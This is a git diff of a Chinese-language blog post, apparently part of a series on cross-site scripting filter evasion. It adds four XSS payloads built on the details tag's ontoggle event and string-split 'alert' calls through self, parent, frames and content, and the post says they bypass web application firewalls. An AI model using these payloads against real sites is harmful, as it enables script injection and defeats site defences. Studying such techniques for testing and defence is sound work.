@@ -23,6 +23,21 @@
 
 ### Top属性类似的补充
 - - -
-还记得上篇的top属性嘛，
+还记得上篇的top属性嘛
 
 ![5](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xfxfayjoj30kg04ot8n.jpg)
+
+实际上可以利用的还有好几个，看到这里各位是否get到什么了。
+
+![6](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xju6slwuj30ub06raac.jpg)
+
+我们可以利用的类似拼接的对象又多了几个，例如：
+```
+<details open ontoggle=self['al'%2B'ert'](1) >
+<details open ontoggle=parent['al'%2B'ert'](1) >
+<details open ontoggle=frames['al'%2B'ert'](1) >
+<details open ontoggle=content['al'%2B'ert'](1) >
+```
+这些都可以绕过waf，总结起来有 `top` `self` `parent` `frames` `content` `windiow`，无疑`top`是最短的，所谓短小精悍。
+
+![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xkryc227j30fp073782.jpg)
